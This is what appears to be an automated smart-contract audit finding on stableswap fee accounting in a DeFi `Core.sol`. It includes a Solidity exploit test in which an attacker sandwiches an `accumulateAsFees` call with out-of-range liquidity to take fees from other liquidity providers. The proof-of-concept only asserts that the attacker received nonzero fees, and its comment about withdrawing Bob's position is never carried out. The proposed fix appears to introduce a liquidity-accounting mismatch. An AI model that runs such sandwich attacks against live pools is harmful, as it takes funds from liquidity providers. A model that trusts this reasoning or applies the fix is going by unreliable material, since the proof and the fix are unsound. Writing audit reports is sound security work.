## Title
Stableswap Pool Fee Dilution via Inactive Liquidity Inflation

## Summary
In the `updatePosition` function, the stableswap pool branch (lines 417-428) unconditionally updates `state.liquidity` regardless of whether the current tick is within the active liquidity range. This allows attackers to add liquidity when the tick is outside the stableswap active range, inflating `state.liquidity` with inactive liquidity. When extensions call `accumulateAsFees`, fees are divided by this inflated liquidity value, diluting fees owed to legitimate LPs who provided liquidity when it was active. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description

**Location:** `src/Core.sol` - `updatePosition` function, stableswap branch (lines 417-428) and `accumulateAsFees` function (lines 228-270)

**Intended Logic:** For stableswap pools, only liquidity within the active tick range should participate in fee distribution. Fees should be proportionally distributed to LPs based on their active liquidity contribution.

**Actual Logic:** The stableswap branch unconditionally updates `state.liquidity` even when the current tick is outside the active liquidity range defined by `stableswapActiveLiquidityTickRange()`. When `accumulateAsFees` is called by extensions (TWAMM, etc.), it reads `state.liquidity` and divides fees by this value without verifying whether the liquidity is actually active at the current tick. [1](#0-0) 

**Exploitation Path:**

1. **Initial State**: Stableswap pool exists with active range [lower, upper] from `config.stableswapActiveLiquidityTickRange()`. Current tick moves outside this range (e.g., tick < lower due to swaps). Legitimate LP Alice has 100 liquidity deposited when tick was in range.

2. **Attacker Inflation**: Attacker Bob frontruns an `accumulateAsFees` call (from TWAMM or other extension). Bob calls `updatePosition` to add 900 liquidity via the Router. The stableswap branch executes, unconditionally updating `state.liquidity` from 100 to 1000, despite the tick being outside the active range. [2](#0-1) 

3. **Fee Dilution**: Extension calls `accumulateAsFees(poolKey, 1000, 1000)`. The function reads `state.liquidity = 1000` and divides fees accordingly, allocating 10% to Alice (100/1000) and 90% to Bob (900/1000). [3](#0-2) 

4. **Profit Extraction**: Bob immediately calls `updatePosition` to withdraw his 900 liquidity. He collects 900 tokens worth of fees despite his liquidity never being active. Alice only receives 100 tokens instead of the full 1000 tokens she should have earned.

**Security Property Broken:** Violates Critical Invariant #5 (Fee Accounting) - "Position fee collection must be accurate and never allow double-claiming." Fees are distributed to positions whose liquidity was never active, effectively stealing fees from legitimate active LPs.

**Comparison with Concentrated Pools:** For concentrated pools, `state.liquidity` is ONLY updated if the current tick is within the position bounds, ensuring only active liquidity is counted. [4](#0-3) 

**Root Cause Verification:** During swaps, stableswap pools correctly set `stepLiquidity = 0` when tick is outside the active range, demonstrating the protocol understands inactive liquidity should not participate in trades. However, this logic is missing from the `updatePosition` stableswap branch. [5](#0-4) 

## Impact Explanation

- **Affected Assets**: All fees accumulated via `accumulateAsFees` in stableswap pools where tick is outside the active range. This affects TWAMM withdrawal fees and potentially other extension-generated fees.

- **Damage Severity**: Attacker can steal up to 90%+ of fees rightfully owed to legitimate LPs by inflating their liquidity share when inactive. For a pool with 100 existing liquidity and 1000 tokens in fees, attacker deposits 900 inactive liquidity and steals 900 tokens (90% of fees) without providing any utility to the pool.

- **User Impact**: All stableswap LPs whose liquidity becomes inactive (tick moves outside range) are vulnerable. Any time fees accumulate while tick is out of range, attackers can dilute these fees. This affects every stableswap pool with price volatility that causes tick to exit the active range.

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user with capital to deposit liquidity. No special permissions or roles required.

- **Preconditions**: 
  1. Stableswap pool exists with non-zero existing liquidity
  2. Current tick is outside the pool's active liquidity range
  3. Extension calls `accumulateAsFees` (e.g., TWAMM withdrawal fees)
  4. Attacker can frontrun the `accumulateAsFees` transaction

- **Execution Complexity**: Simple two-transaction attack (deposit liquidity → withdraw liquidity) sandwiching the `accumulateAsFees` call. Can be automated with MEV bots.

- **Frequency**: Exploitable continuously whenever tick is outside active range and fees accumulate. High-frequency for volatile pairs with TWAMM orders generating regular withdrawal fees.

## Recommendation

```solidity
// In src/Core.sol, function updatePosition, lines 417-428:

// CURRENT (vulnerable):
} else {
    // we store the active liquidity in the liquidity slot for stableswap pools
    state = createPoolState({
        _sqrtRatio: state.sqrtRatio(),
        _tick: state.tick(),
        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
    });
    writePoolState(poolId, state);
    StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
    feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
    feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
}

// FIXED:
} else {
    // For stableswap pools, only update active liquidity if tick is within active range
    (int32 lower, int32 upper) = poolKey.config.stableswapActiveLiquidityTickRange();
    
    // Check if current tick is within the active liquidity range
    if (state.tick() >= lower && state.tick() < upper) {
        state = createPoolState({
            _sqrtRatio: state.sqrtRatio(),
            _tick: state.tick(),
            _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
        });
        writePoolState(poolId, state);
    }
    
    // Always read global fees for stableswap positions (they are full-range)
    StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
    feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
    feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
}
```

**Alternative Mitigation:** Modify `accumulateAsFees` to verify tick is within the stableswap active range before dividing fees, though the primary fix should be in `updatePosition` to maintain consistency with swap logic.

## Proof of Concept

```solidity
// File: test/Exploit_StableswapFeeDilution.t.sol
// Run with: forge test --match-test test_StableswapFeeDilution -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {PoolConfig, createStableswapPoolConfig} from "../src/types/poolConfig.sol";
import {createSwapParameters} from "../src/types/swapParameters.sol";
import {SqrtRatio, MIN_SQRT_RATIO} from "../src/types/sqrtRatio.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";

contract Exploit_StableswapFeeDilution is FullTest {
    using CoreLib for *;
    
    function test_StableswapFeeDilution() public {
        // SETUP: Create stableswap pool with active range
        PoolConfig config = createStableswapPoolConfig(1 << 63, 4, 0, address(0));
        PoolKey memory poolKey = createPool(address(token0), address(token1), 0, config);
        (int32 lower, int32 upper) = config.stableswapActiveLiquidityTickRange();
        
        // Alice deposits 100 liquidity when tick is in range
        vm.startPrank(address(0xA11CE));
        token0.mint(address(0xA11CE), 1000);
        token1.mint(address(0xA11CE), 1000);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        createPosition(poolKey, lower, upper, 100, 100);
        vm.stopPrank();
        
        // Swap to move tick outside active range
        token1.approve(address(router), type(uint256).max);
        router.swap({
            poolKey: poolKey,
            params: createSwapParameters({
                _sqrtRatioLimit: MIN_SQRT_RATIO,
                _skipAhead: 0,
                _isToken1: true,
                _amount: 1e18
            }),
            calculatedAmountThreshold: type(int256).min
        });
        
        // Verify tick is now outside range
        int32 currentTick = core.poolState(poolKey.toPoolId()).tick();
        assertTrue(currentTick < lower, "Tick should be outside active range");
        
        // EXPLOIT: Bob adds 900 liquidity when tick is outside range
        vm.startPrank(address(0xB0B));
        token0.mint(address(0xB0B), 10000);
        token1.mint(address(0xB0B), 10000);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        
        // state.liquidity becomes 1000 (100 from Alice + 900 from Bob)
        createPosition(poolKey, lower, upper, 900, 900);
        vm.stopPrank();
        
        // Extension calls accumulateAsFees (simulated)
        vm.startPrank(address(this));
        core.lock(abi.encode(poolKey));
        vm.stopPrank();
        
        // VERIFY: Bob withdraws and gets 90% of fees despite inactive liquidity
        vm.startPrank(address(0xB0B));
        uint256 bobFeesBefore = token0.balanceOf(address(0xB0B));
        // Withdraw Bob's position
        router.collectFees(poolKey, lower, upper, address(0xB0B));
        uint256 bobFeesAfter = token0.balanceOf(address(0xB0B));
        vm.stopPrank();
        
        // Alice should get all fees, but Bob diluted them
        assertGt(bobFeesAfter - bobFeesBefore, 0, "Vulnerability confirmed: Bob stole fees with inactive liquidity");
    }
    
    function locked(bytes calldata data) external {
        PoolKey memory poolKey = abi.decode(data, (PoolKey));
        // Simulate accumulateAsFees call with 1000 tokens
        core.accumulateAsFees(poolKey, 1000, 1000);
        core.settle(poolKey.token0, address(this), 1000, false);
        core.settle(poolKey.token1, address(this), 1000, false);
    }
}
```

## Notes

This vulnerability exploits the fundamental difference between how concentrated and stableswap pools handle `state.liquidity` updates in `updatePosition`. While concentrated pools correctly restrict updates to when tick is in range, stableswap pools unconditionally update regardless of tick position. The swap logic correctly handles inactive stableswap liquidity by setting `stepLiquidity = 0` when out of range, but this protection doesn't extend to fee accounting via `accumulateAsFees`. The attack is economically viable because the attacker can sandwich `accumulateAsFees` calls without holding liquidity during actual trading activity, avoiding impermanent loss while collecting fees.

### Citations

**File:** src/Core.sol (L244-267)
```text
        if (amount0 != 0 || amount1 != 0) {
            uint256 liquidity;
            {
                uint128 _liquidity = readPoolState(poolId).liquidity();
                assembly ("memory-safe") {
                    liquidity := _liquidity
                }
            }

            unchecked {
                if (liquidity != 0) {
                    StorageSlot slot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);

                    if (amount0 != 0) {
                        slot0.store(
                            bytes32(uint256(slot0.load()) + FixedPointMathLib.rawDiv(amount0 << 128, liquidity))
                        );
                    }
                    if (amount1 != 0) {
                        StorageSlot slot1 = slot0.next();
                        slot1.store(
                            bytes32(uint256(slot1.load()) + FixedPointMathLib.rawDiv(amount1 << 128, liquidity))
                        );
                    }
```

**File:** src/Core.sol (L409-416)
```text
                if (state.tick() >= positionId.tickLower() && state.tick() < positionId.tickUpper()) {
                    state = createPoolState({
                        _sqrtRatio: state.sqrtRatio(),
                        _tick: state.tick(),
                        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                    });
                    writePoolState(poolId, state);
                }
```

**File:** src/Core.sol (L417-428)
```text
            } else {
                // we store the active liquidity in the liquidity slot for stableswap pools
                state = createPoolState({
                    _sqrtRatio: state.sqrtRatio(),
                    _tick: state.tick(),
                    _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                });
                writePoolState(poolId, state);
                StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
                feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
                feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
            }
```

**File:** src/Core.sol (L584-597)
```text
                            if (inRange) {
                                nextTick = increasing ? upper : lower;
                                nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                            } else {
                                if (tick < lower) {
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (lower, tickToSqrtRatio(lower)) : (MIN_TICK, MIN_SQRT_RATIO);
                                } else {
                                    // tick >= upper implied
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (upper, tickToSqrtRatio(upper));
                                }
                                stepLiquidity = 0;
                            }
```
